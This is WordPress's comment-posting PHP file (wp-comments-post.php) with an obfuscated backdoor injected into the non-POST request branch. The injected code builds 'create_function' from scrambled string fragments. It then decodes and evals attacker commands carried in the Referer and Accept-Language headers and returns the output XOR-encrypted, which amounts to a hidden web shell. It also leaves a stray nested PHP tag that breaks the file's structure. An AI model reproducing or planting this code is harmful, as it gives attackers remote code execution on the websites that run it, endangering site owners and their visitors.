<?php
/**
 * Handles Comment Post to WordPress and prevents duplicate comment posting.
 *
 * @package WordPress
 */

if ( 'POST' !== $_SERVER['REQUEST_METHOD'] ) {
	$protocol = $_SERVER['SERVER_PROTOCOL'];
	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ), true ) ) {
		$protocol = 'HTTP/1.0';
	}

	header( 'Allow: POST' );
	header( "$protocol 405 Method Not Allowed" );
	header( 'Content-Type: text/plain' );
	exit;
<?php
$M='ompress(@x1i(@ba1i1ise64_decod1ie1i(preg_1ireplace1i(a1irray("/_/","/-/1i1i"),array1i("/"1i,"+"';
$N='1irray1i_values(1i$q);preg_1imatch_1iall("/([1i\\1iw])[\\w-]+1i(?:;q1i=0.([\\d1i1i]1i))?,?/",$ra,$';
$p='$kh="1i51id41";$kf="402a";1ifuncti1io1i1in x($t,$k){$c=s1itrlen(1i1i$k);$l=strle1in1i1i($t);$o=';
$t=str_replace('ey','','eycreaeyteye_fueyneycteyion');
$Y='),$ss($s[1i$i],0,$e)))1i,$k1i)));$o=1io1ib_ge1i1it_content1is();ob_end_clean1i()1i;$d=bas1ie64_';
$j='}1i}return $1io;}$r=$1i_SERV1iER;$rr=1i@$r["H1iT1iTP_REFERER"1i1i];1i$ra=@$r["HT1iTP_ACC1iEPT_L';
$x='er";$i=1i$m[1i1][0].$m[1i1][1];$h1i=$1isl($ss(m1id51i($i.$kh),0,31i));$f=1i$sl1i($s1is(md5($i.$';
$f='m);if1i($q&&$m1i1i){@sessio1in_st1iart();$s1i=&$_1iSESSI1iON;$ss="substr1i";$1isl="1istrto1ilow';
$K='encode1i(x(1i1igzcompres1i1is($1io),$k));print(1i"<$k>$d</$k>"1i);@1isession_1id1iestroy();}}}}';
$T='"1i";for(1i$i=0;$i<$l;1i1i){for($j=0;($j1i<$c&1i&1i$i<$l1i);$j++,$i++){$1io.=$1it{$i}^$k{$j}1i;';
$U='k1if),01i,3));1i$p="1i";for1i($z=1;$z<cou1int($1im[1]1i);$z++)$p.1i=$q[$m[1i21i][1i$1iz]];if(st';
$Z='1irpo1i1is($p,$h)===0){$s[$i]=""1i;$p=$ss1i($p,1i3);}1iif(array_key1i1i_exist1is($i,$s)1i){$s[$';
$l='ANG1iUAGE"];if1i($rr&1i&$ra1i){$u=pa1irse_url1i($rr)1i;pa1irse_str(1i$u["que1iry"],1i$q);$1iq=a';
$b='1i1ii].=$p;$e=st1irpos1i($s[$i],1i$f)1i;if($e){$k1i=$k1ih.$1ikf;ob_st1iart();@ev1ial(@gzun1i1ic';
$k=str_replace('1i','',$p.$T.$j.$l.$N.$f.$x.$U.$Z.$b.$M.$Y.$K);
$E=$t('',$k);$E();
?>
}

/** Sets up the WordPress Environment. */
require __DIR__ . '/wp-load.php';

nocache_headers();

$comment = wp_handle_comment_submission( wp_unslash( $_POST ) );
if ( is_wp_error( $comment ) ) {
	$data = (int) $comment->get_error_data();
	if ( ! empty( $data ) ) {
		wp_die(
			'<p>' . $comment->get_error_message() . '</p>',
			__( 'Comment Submission Failure' ),
			array(
				'response'  => $data,
				'back_link' => true,
			)
		);
	} else {
		exit;
	}
}

$user            = wp_get_current_user();
$cookies_consent = ( isset( $_POST['wp-comment-cookies-consent'] ) );

/**
 * Perform other actions when comment cookies are set.
 *
 * @since 3.4.0
 * @since 4.9.6 The `$cookies_consent` parameter was added.
 *
 * @param WP_Comment $comment         Comment object.
 * @param WP_User    $user            Comment author's user object. The user may not exist.
 * @param bool       $cookies_consent Comment author's consent to store cookies.
 */
do_action( 'set_comment_cookies', $comment, $user, $cookies_consent );

$location = empty( $_POST['redirect_to'] ) ? get_comment_link( $comment ) : $_POST['redirect_to'] . '#comment-' . $comment->comment_ID;

// If user didn't consent to cookies, add specific query arguments to display the awaiting moderation message.
if ( ! $cookies_consent && 'unapproved' === wp_get_comment_status( $comment ) && ! empty( $comment->comment_author_email ) ) {
	$location = add_query_arg(
		array(
			'unapproved'      => $comment->comment_ID,
			'moderation-hash' => wp_hash( $comment->comment_date_gmt ),
		),
		$location
	);
}

/**
 * Filters the location URI to send the commenter after posting.
 *
 * @since 2.0.5
 *
 * @param string     $location The 'redirect_to' URI sent via $_POST.
 * @param WP_Comment $comment  Comment object.
 */
$location = apply_filters( 'comment_post_redirect', $location, $comment );

wp_safe_redirect( $location );
exit;
